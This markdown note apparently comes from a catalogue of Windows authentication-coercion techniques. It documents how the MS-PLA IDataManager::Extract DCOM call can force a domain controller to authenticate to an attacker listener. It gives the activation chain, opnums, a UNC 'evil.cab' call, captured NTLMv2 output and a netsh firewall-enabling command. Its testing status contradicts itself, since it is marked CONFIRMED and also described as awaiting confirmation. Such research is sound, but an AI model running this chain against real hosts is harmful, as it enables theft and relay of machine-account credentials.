# MS-PLA - Remote call to Extract (opnum 31)

## Summary

+ **Protocol**: [[MS-PLA]: Performance Logs and Alerts Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700)

+ **Interface**: `IDataManager` (IID `03837541-098b-11d8-9414-505054503030`) — **not** `IDataCollectorSet`. `Extract` is a method of `IDataManager`, reached by **DCOM activation** of the `DataCollectorSet` coclass and then `IDataCollectorSet::get_DataManager`. There is no named pipe.

+ **Function name**: [`Extract`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/e0fbbb46-286e-4d68-bd3b-a84238f80e1a)

+ **Function operation number**: `31` (on `IDataManager`: `IDispatch` occupies opnums 0-6, `Run` = 30, `Extract` = 31)

+ **Authenticated**: Yes (local administrator; PLA DCOM launch/access)

## Description

`IDataManager::Extract` extracts a cabinet (`.cab`) file into a destination directory. Both
parameters are strings the server acts on:

+ **CabFilename**: the server **opens the cab file to read it** — a UNC here coerces the machine
  account outbound (read-only; no writable share required). This is the primary vector.
+ **DestinationPath**: where the extracted files are written — a UNC here would also coerce, but the
  cab must be valid/openable first.

## Reaching the call — DCOM chain

`Extract` is not a bare RPC call. It is obtained via:

1. **DCOM activation** of the `DataCollectorSet` coclass —
   `CLSID_DataCollectorSet = 03837521-098b-11d8-9414-505054503030` (from the Windows SDK `pla.h`;
   note this is **`...21`**, distinct from the interface `IDataCollectorSet = ...20`; activating
   with `...20` returns `REGDB_E_CLASSNOTREG`), requesting `IID_IDataCollectorSet` (`...20`).
2. `IDataCollectorSet::get_DataManager` (**opnum 57**) → returns an `IDataManager` interface pointer.
3. `IDataManager::Extract(CabFilename = \\<listener>\share\evil.cab, DestinationPath = ...)`
   (**opnum 31**).

+ **Privilege**: local administrator on the target.
+ **Coerced parameter**: `CabFilename` (BSTR, UNC).

## Function technical detail

```cpp
// interface IDataManager : IDispatch
HRESULT Extract(
   [in] BSTR CabFilename,
   [in] BSTR DestinationPath
 );
```

## Testing status — CONFIRMED (with required target-side prerequisites)

**Confirmed coercion on Windows Server 2025** (domain controller), 2026-09-13, once the
prerequisites below were met. Full DCOM chain via
[`poc/python/coerce_poc.py`](./poc/python/coerce_poc.py) (impacket `DCOMConnection`):

```
CoCreateInstanceEx(CLSID_DataCollectorSet {03837521-...}, IID_IDataCollectorSet {03837520-...})
IDataCollectorSet::get_DataManager                                     [opnum 57] -> IDataManager
IDataManager::Extract(CabFilename="\\<listener>\share\evil.cab", ...)  [opnum 31]
  -> listener: TMP-W-2025-DC1$ authenticated (NTLMv2 captured)
```

The service opened the UNC `CabFilename` (authenticating as the DC machine account) before failing
to parse it (`0x80300113`, not a valid cabinet — a benign post-auth status; only the captured hash
on the listener is evidence, not the return code). Notes established during testing:

- `CoCreateInstanceEx` must use the coclass CLSID `03837521-...` (`...21`); the interface
  `IID_IDataCollectorSet` (`...20`) as the CLSID returns `REGDB_E_CLASSNOTREG`.
- Each DCOM method call carries the interface IPID as the ORPC object id
  (`interface.request(req, iid, interface.get_iPid())`).

### PREREQUISITES

1. **Local administrator** on the target (PLA DCOM launch/access).
2. **The "Performance Logs and Alerts" firewall rule group must be ENABLED** — a predefined group
   (DCOM-In + TCP-In), **disabled by default**. PLA is DCOM-only on the RPC dynamic range, so with
   the group off the activation on 135 works but interface calls are dropped. Enable on the target:

   ```
   netsh advfirewall firewall set rule group="Performance Logs and Alerts" new enable=yes
   ```

   This is the same class of gate as MS-VDS ("Remote Volume Management") and MS-COMA
   (`RemoteAccessEnabled`).

Once the group is enabled, `Extract` with a UNC `CabFilename` is expected to coerce (the server opens
the cab to read it). This will be updated to CONFIRMED after a live capture.

## References

+ Documentation of protocol [MS-PLA]: Performance Logs and Alerts Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700

+ Documentation of function `Extract` (opnum 31): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/e0fbbb46-286e-4d68-bd3b-a84238f80e1a

+ MS-PLA Appendix A (Full IDL): https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/73f1326e-2bf4-4658-b3e9-409b59e2d742
